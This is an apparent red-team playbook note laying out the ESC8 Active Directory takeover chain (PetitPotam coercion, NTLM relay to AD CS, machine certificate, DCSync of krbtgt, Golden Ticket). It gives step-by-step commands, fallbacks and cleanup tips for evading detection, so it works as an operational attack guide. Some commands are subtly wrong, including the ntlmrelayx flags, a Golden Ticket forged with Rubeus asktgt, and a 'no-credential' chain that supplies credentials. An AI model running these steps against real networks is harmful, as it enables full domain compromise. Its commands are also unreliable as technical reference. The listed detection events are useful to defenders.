---
title: "Attack Path: ESC8 (PetitPotam → NTLM relay → AD CS machine cert) → DCSync → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, ad-cs, relay, dcsync, privilege-escalation]
---

# Attack Path: ESC8 (PetitPotam → NTLM relay → AD CS machine cert) → DCSync → Domain Admin

The no-credential **ESC8** kill-chain: coerce a target to make an NTLM
authentication with **PetitPotam** (MS-EFSRPC), **relay** that NTLM to **AD CS**
with [[ntlmrelayx]], and have it **issue a machine certificate** for the
coerced machine. If that machine is a **DC** (or otherwise holds a DCSync
right), you now hold its identity — use it to **DCSync** `krbtgt` and go
Golden Ticket → Domain Admin. This is the "you have zero creds, only a
coercion vector + an AD CS relay target" path. See [[esc8-ntlm-relay-adcs]]
for the mechanics, [[petitpotam]] for the coercion primitive.

## Chain

```
You (low-priv, coercion vector on target T)
  --PetitPotam (MS-EFSRPC)--> T is forced to NTLM-auth to your ntlmrelayx
  --ntlmrelayx relays T's NTLM to AD CS (http)--> request a MACHINE cert for T
  --T is a DC / holds GetChanges--> you now authenticate AS T (the machine)
  --DCSync krbtgt (as T)-->
  Golden Ticket --> Domain Admin
```

## Prerequisites / what signals this path exists

- A **coercion vector** on a target `T` you want to become — typically a **DC**
  (best case) or a machine that holds a DCSync right. [[petitpotam]] lists the
  coercion methods (MS-EFSRPC here).
- `T` must be **able to authenticate to AD CS** over the relay (the relay
  carries its NTLM to the CA's HTTP endpoint).
- AD CS must allow **machine-cert** issuance on a template the relayed account
  can enroll to (the `Machine` template / `Kerberos` EKU). See
  [[ad-cs-esc-attacks]] / [[esc8-ntlm-relay-adcs]].
- Confirm the target holds the DCSync right (BloodHound: `T` → `GetChangesAll`)
  *before* committing — the whole chain only pays out if `T` can replicate.

```bash
# 1. Confirm T is coercible + holds DCSync (BloodHound / direct)
# 2. Confirm AD CS is up and the Machine template is available
certipy find -u <you>@corp.local -p <pw> -dc-ip <dc> -stdout   # see CAs/templates
```

## Step 1 — Start the relay to AD CS

```bash
# Listener that will relay the coerced NTLM to AD CS and request a machine cert
ntlmrelayx.py -t ldap://<dc> -ts http://<adcs> -smb2support   # see esc8-ntlm-relay-adcs for the exact AD CS flags
# (for a machine cert the relay target is the CA's certsrv HTTP endpoint)
```
**Verify:** ntlmrelayx is listening and shows the AD CS target. See
[[esc8-ntlm-relay-adcs]] for the precise flags (`-wh`, template selection).

### Failure modes & fallbacks
- **`T` doesn't reach your relay** — the coercion must route `T`'s NTLM to your
  listener (port/SMBS/HTTP reachability). Confirm the path before coercing.
- **AD CS rejects the relay** — wrong template / EKU; the relayed machine
  account must be able to enroll to a machine template. See
  [[ad-cs-esc-attacks]].

## Step 2 — Coerce with PetitPotam

```bash
petitpotam.py -u <you>@corp.local -p <pw> -h <target-T>   # MS-EFSRPC coercion
```
**Verify:** ntlmrelayx shows `T`'s machine account NTLM being received and
relayed to AD CS, and a **machine certificate** for `T` is issued (the tool
prints/saves the `.pfx`). See [[petitpotam]].

### Failure modes & fallbacks
- **`T` already has an EFS cert / the RPC fails** — try another coercion method
  (WCF/MS-DT, HTTP, etc.) or another target. See [[petitpotam]].
- **No cert issued** — the machine template wasn't enrolee-able; check the AD
  CS config (ESC4 on the template, or a different CA).

## Step 3 — Authenticate as `T` (the machine) and DCSync

You now hold `T`'s **machine certificate** (and its NT context). Authenticate
as the machine and replicate:

```bash
# Use the machine cert / machine context to DCSync krbtgt
secretsdump.py -dc-ip <dc> corp.local/<T-machine>$@ -just-dc-user krbtgt
# (or via the cert: certipy auth / Rubeus asktgt /certificate:)
```
**Verify:** output shows `krbtgt` `aes256-cts-hmac-sha1-96`. Save it. See
[[dcsync]].

### Failure modes & fallbacks
- **`T` isn't a DC / no DCSync right** — you have a *machine* identity, not
  domain dominance. Pivot: the machine cert may give you **lateral** to `T`
  (psexec/smb) and from there a new foothold. Re-evaluate the BloodHound graph
  from `T`.
- **Replication error** — retarget the PDC emulator.

## Step 4 — Domain dominance

```powershell
Rubeus.exe asktgt /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /aes256:<krbtgt-aes256> /sids:S-1-5-21-...:512 /ptt
whoami /all   # -> corp.local\administrator + 512
```
See [[golden-silver-tickets]]. **Verify:** `whoami /all` lists
`corp.local\administrator`.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1-2 (coerce+relay) | **4624/4625** NTLM logons from `T` to your relay host; MS-EFSRPC call to `T` | an unexpected NTLM from a DC/machine to a non-standard host |
| 2 (cert issue) | **AD CS 4886** (cert issued) for a **machine** account, `Machine` template | a machine cert minted at an odd time |
| 3 (DCSync) | **4662** on the domain object (GetChanges+GetChangesAll) from `T` | a *machine* account replicating |
| 4 (Golden) | 4768/4624 for Administrator from a non-DC | DA off-DC |

## Cleanup notes
- The coercion + relay leaves **NTLM logon** trails (4624/4625) from `T` — the
  loudest part of the chain.
- The **AD CS cert issue** (4886) is a durable artifact — a machine cert for
  `T` now exists in the CA.
- DCSync's trail is 4662. Expect `krbtgt` to rotate twice if caught
  ([[krbtgt]]).
- `T`'s EFS cert may now exist (PetitPotam side effect) — clean up if you
  don't want a standing tell.

## Related
- [[esc8-ntlm-relay-adcs]] — the ESC8 mechanics (coerce → relay → machine cert)
- [[petitpotam]] — the MS-EFSRPC coercion primitive (step 2)
- [[ntlmrelayx]] — the relay engine (step 1)
- [[ad-cs-esc-attacks]] — the template/config surface the relay needs
- [[dcsync]], [[golden-silver-tickets]] — steps 3-4
- [[service-principal-name]] — why a *machine* SPN/identity matters here
- [[mitm6-ipv6-relay]] — the IPv6 coercion/relay alternative to PetitPotam
